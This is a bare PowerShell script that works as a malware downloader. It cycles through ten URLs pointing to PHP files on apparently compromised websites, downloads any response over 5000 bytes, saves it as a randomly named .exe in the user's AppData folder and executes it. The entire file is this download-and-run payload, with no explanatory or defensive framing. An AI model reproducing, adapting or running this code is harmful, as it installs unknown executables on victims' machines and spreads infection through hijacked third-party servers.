function Show {
param()
function Show2 {
$urls = ("https://exaltmathiasministries.org/wp-content/plugins/litespeed-cache/src/cdn/ZdAc74PA.php",
"https://campnaturevalley.com/skins/default/33yqn9vPNXl.php",
"https://jbg-electric.com/css/x0sJv3Efx.php",
"https://teachon.aerialview.lk/systemdemo/uploads/addons/__MACOSX/live-class/F2U4P7U3jk.php",
"https://bitcoinup.glancesad.com/css/font-awesome/css/1JFw9h5gbXcKmC.php",
"https://bitcoins-earns.vjeduabroad.com/images/icons/png/fiseu4nDcIwr0mm.php",
"https://acerosmauri.com/ceo/lib/chart.js/docs/axes/cuWqPJ7b9uTXMs5.php",
"https://e-vistoria.com/ev2/vendor/phpdocumentor/reflection-common/src/xLPkwfH8E.php",
"https://prowebhq.com/wp-content/themes/twentynineteen/template-parts/content/LdKaJkQOuW6NeL.php",
"https://iach154015.aps.agile451.net/pdfviewer/web/locale/ach/pwUT5yQdOQp4jA.php")
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Foreach ($url in $urls)
{Write-Host $url

$Response = Invoke-WebRequest -URI $url -Method "GET"
Write-Host $Response.Content.Length
if ($Response.Content.Length -gt 5000){


        $name = Get-Random -Minimum 10000 -Maximum 99999
        Set-Content $env:APPDATA/$name.exe -Value $Response.Content -Encoding Byte
        Start-Process -FilePath  "$env:APPDATA/$name.exe"

        break
    }

Write-Host $name


Write-Host $data1}
}
;Show2}
